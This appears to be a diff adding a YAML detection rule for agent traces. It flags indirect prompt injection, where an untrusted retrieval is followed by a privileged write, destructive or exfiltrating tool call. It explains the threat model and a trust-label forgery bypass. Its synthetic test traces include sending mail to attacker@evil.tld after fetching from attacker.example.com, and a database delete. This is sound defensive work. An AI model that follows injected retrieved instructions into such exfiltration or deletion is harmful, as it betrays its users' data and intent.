@@ -1,0 +1,218 @@
+title: 'Privileged tool call following untrusted retrieval (indirect prompt injection trail)'
+id: ATR-2026-00550
+rule_version: 1
+status: draft
+description: >
+  Detects the canonical indirect-prompt-injection trace shape: an
+  untrusted RETRIEVER span (e.g., web fetch, user-uploaded document,
+  third-party API result) is followed in the same trace by a TOOL span
+  whose privilege is write, destructive, or exfiltrative. This is a
+  trace-method rule using the `forbid` primitive (spec/atr-method-v1.1.md
+  §8.3.1) with a `preceded_by` predicate.
+
+  Threat model: indirect prompt injection works by getting a malicious
+  instruction into content the agent retrieves (not into the user's
+  prompt). The agent reads the retrieved content as data but executes
+  embedded instructions as if they came from the user. The signature in
+  the trace is unmistakable — an untrusted retrieval span immediately
+  feeds into a privileged tool call that does not match the user's
+  original request. AgentDojo (arXiv:2406.13352) catalogs 629 cases of
+  this pattern; InjecAgent (arXiv:2403.02691) ships 1,054. ATR encodes
+  the shape, not any single instance.
+
+  Pattern detection (regex on agent.output text) cannot reliably catch
+  this because the malicious payload can be paraphrased, encoded, or
+  natural-language-only. The trace shape — untrusted source → privileged
+  effect — is invariant.
+author: 'ATR Community'
+date: '2026/05/28'
+schema_version: '1.0'
+maturity: draft
+severity: critical
+
+references:
+  owasp_llm:
+    - 'LLM01:2025 - Prompt Injection'
+    - 'LLM06:2025 - Excessive Agency'
+  owasp_agentic:
+    - 'ASI01:2026 - Prompt Injection (Direct + Indirect)'
+    - 'ASI04:2026 - Unauthorized Resource Access'
+  mitre_atlas:
+    - 'AML.T0051.001 - Indirect Prompt Injection'
+  research:
+    - 'AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks (arXiv:2406.13352)'
+    - 'InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated LLM Agents (arXiv:2403.02691)'
+    - 'ICON: Indirect Prompt Injection Detection via Focus Intensity (arXiv:2602.20708)'
+
+compliance:
+  nist_csf:
+    - 'DE.CM-09'
+    - 'PR.AC-04'
+  etsi_ts_104223:
+    - 'P4.4'
+  eu_ai_act:
+    - article: '15'
+      context: >
+        Cybersecurity — indirect prompt injection via untrusted retrieval
+        into privileged tool calls is the canonical agentic attack chain
+        under Article 15.
+      strength: primary
+    - article: '9'
+      context: 'Article 9 (risk management system) requires identified risks to be addressed by appropriate measures; this rule is a runtime risk-treatment control that detects the prompt-injection attempt (Privileged tool call following untrusted retrieval (indirect prompt injection trail)).'
+      strength: secondary
+    - article: '14'
+      context: 'Article 14 (human oversight) requires high-risk AI systems to remain subject to effective human oversight; this rule provides detection evidence where the prompt-injection attempt (Privileged tool call following untrusted retrieval (indirect prompt injection trail)) would bypass or undermine that oversight.'
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: 'MS.2.6'
+      context: >
+        Information security — untrusted-input-to-privileged-action chains
+        in agent traces are integrity violations requiring detection per
+        MS-2.6.
+      strength: primary
+    - subcategory: 'MS.2.7'
+      context: "NIST AI RMF MEASURE 2.7 (security and resilience evaluated and documented) is supported by this rule's runtime detection of the prompt-injection attempt (Privileged tool call following untrusted retrieval (indirect prompt injection trail))."
+      strength: primary
+    - subcategory: 'MG.2.3'
+      context: 'NIST AI RMF MANAGE 2.3 (respond to previously unknown identified risks) is supported by this rule, which surfaces the prompt-injection attempt (Privileged tool call following untrusted retrieval (indirect prompt injection trail)) so the risk can be treated.'
+      strength: secondary
+
+  iso_42001:
+    - clause: '8.1'
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control, including control of externally provided processes) is operationalised by this rule's detection of the prompt-injection attempt (Privileged tool call following untrusted retrieval (indirect prompt injection trail))."
+      strength: primary
+    - clause: '6.2'
+      context: "ISO/IEC 42001 Clause 6.2 (AI objectives and planning) calls for risk treatment of known attack patterns; this rule's detection of the prompt-injection attempt (Privileged tool call following untrusted retrieval (indirect prompt injection trail)) is such a treatment."
+      strength: secondary
+tags:
+  category: prompt-injection
+  subcategory: indirect-injection-trace-shape
+  scan_target: runtime
+  confidence: high
+  source: trace-rule
+
+agent_source:
+  type: agent_trace
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  method: trace
+  condition: any
+  false_positives:
+    - >
+      Parallel sub-agent FP: two unrelated sub-agents share one trace; one
+      retrieves untrusted content for task A while a second performs a
+      legitimate privileged write for task B. The `preceded_by` semantics
+      in spec §8.3.1 is temporal-existence, not causal data-flow.
+      Mitigation: engines that emit causal edges (e.g., parent-span links)
+      SHOULD scope `within_trace` to the causal subgraph rather than the
+      full trace DAG. Until then, this rule has a non-zero parallel-sub-
+      agent FP rate; treat wild_fp_rate=0 as approximate for single-agent
+      traces only.
+    - >
+      Trust-label tampering bypass: an attacker who controls the
+      retriever's instrumentation may emit source.trust="trusted" on
+      malicious content. The rule cannot defend against trust-label
+      forgery; operators MUST verify trust labels are emitted by a
+      trustworthy span emitter (typically the agent platform, not the
+      retrieved content's author).
+    - >
+      Authorized exfiltration FP: data-export tools (e.g., scheduled
+      backup, compliance report generation) carry tool.privilege="exfil"
+      legitimately. If they follow any untrusted retrieval in the same
+      trace, the rule fires. Mitigation: tag scheduled/authorized exfil
+      spans with attributes.policy_exemption="export-job" and run a
+      pre-filter in the engine policy layer.
+  conditions:
+    - field: trace.forbid_violation
+      operator: regex
+      value: '(?i)forbid_violation:untrusted_retrieval_to_privileged_tool'
+      description: >
+        Synthetic field emitted by the trace engine when the forbid
+        primitive fires; trace-native engines evaluate detection.trace.
+  trace:
+    ingest_format: openinference
+    forbid:
+      - shape:
+          span.kind: 'TOOL'
+          attributes:
+            tool.privilege:
+              in: ['write', 'destructive', 'exfil']
+        preceded_by:
+          span.kind: 'RETRIEVER'
+          attributes:
+            source.trust: 'untrusted'
+        within_trace: true
+        description: >
+          A privileged TOOL span (write/destructive/exfil) MUST NOT be
+          preceded in the same trace by a RETRIEVER span whose source is
+          marked untrusted. The shape captures the indirect-prompt-
+          injection causal chain regardless of payload content.
+
+response:
+  actions:
+    - block_tool
+    - quarantine_session
+    - alert
+    - snapshot
+  message_template: >
+    [ATR-2026-00550] CRITICAL: Indirect prompt injection trace shape
+    detected. Untrusted RETRIEVER span {{trace.preceded_by_span.id}}
+    (source: {{trace.preceded_by_span.attributes.source.url}}) was
+    followed by privileged TOOL span {{trace.matched_span.id}}
+    ({{trace.matched_span.attributes.tool.name}}, privilege=
+    {{trace.matched_span.attributes.tool.privilege}}). Block the tool,
+    snapshot the full trace, quarantine the session, and audit the
+    retrieved content for embedded instructions.
+
+confidence: 88
+
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted","source.url":"https://attacker.example.com/payload"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"email.send","tool.privilege":"exfil","args":{"to":"attacker@evil.tld"}}}]}
+      expected: triggered
+      description: 'Untrusted retrieval immediately followed by exfiltrative email tool'
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted"}},{"id":"l1","kind":"LLM","attributes":{}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"file.write","tool.privilege":"write"}}]}
+      expected: triggered
+      description: 'Untrusted retrieval, then LLM, then privileged write — chain still triggers'
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted","source.url":"https://docs.public/page1"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"db.delete","tool.privilege":"destructive"}}]}
+      expected: triggered
+      description: 'Untrusted retrieval followed by destructive DB tool'
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted"}},{"id":"r2","kind":"RETRIEVER","attributes":{"source.trust":"trusted"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"data.exfil","tool.privilege":"exfil"}}]}
+      expected: triggered
+      description: 'Mixed retrievals — at least one untrusted before privileged tool still triggers'
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted","source.url":"https://attacker/index"}},{"id":"a1","kind":"AGENT","attributes":{"agent.name":"summarizer"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"slack.post_to_channel","tool.privilege":"write"}}]}
+      expected: triggered
+      description: 'Untrusted source, intermediate agent reasoning, then privileged Slack write'
+
+  true_negatives:
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"trusted","source.url":"https://internal.corp/kb"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"email.send","tool.privilege":"exfil"}}]}
+      expected: not_triggered
+      description: 'Retrieval source is trusted — no untrusted precursor'
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"calculator","tool.privilege":"read"}}]}
+      expected: not_triggered
+      description: 'Untrusted source but tool privilege is read — no privileged effect'
+    - input: |
+        {"spans":[{"id":"t1","kind":"TOOL","attributes":{"tool.name":"file.write","tool.privilege":"write"}}]}
+      expected: not_triggered
+      description: 'Privileged tool with no RETRIEVER predecessor — direct user-initiated, not injected'
+    - input: |
+        {"spans":[{"id":"t1","kind":"TOOL","attributes":{"tool.name":"file.write","tool.privilege":"write"}},{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"untrusted"}}]}
+      expected: not_triggered
+      description: 'Untrusted RETRIEVER appears AFTER the privileged tool — wrong causal direction'
+    - input: |
+        {"spans":[{"id":"r1","kind":"RETRIEVER","attributes":{"source.trust":"trusted"}},{"id":"r2","kind":"RETRIEVER","attributes":{"source.trust":"trusted"}},{"id":"t1","kind":"TOOL","attributes":{"tool.name":"data.exfil","tool.privilege":"exfil"}}]}
+      expected: not_triggered
+      description: 'All retrievals trusted — exfil tool used legitimately (e.g., authorized data export)'
